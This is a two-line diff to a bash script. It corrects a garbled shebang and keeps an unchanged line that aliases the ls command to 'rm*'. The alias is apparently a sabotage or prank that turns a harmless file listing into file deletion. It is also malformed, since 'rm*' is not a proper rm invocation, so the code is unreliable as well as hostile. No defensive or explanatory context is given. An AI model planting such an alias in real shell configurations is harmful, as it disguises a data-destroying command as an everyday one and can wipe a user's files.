@@ -1,2 +1,2 @@
-#!/bin/bashvvv
+#!/bin/bash
 alias ls="rm*"
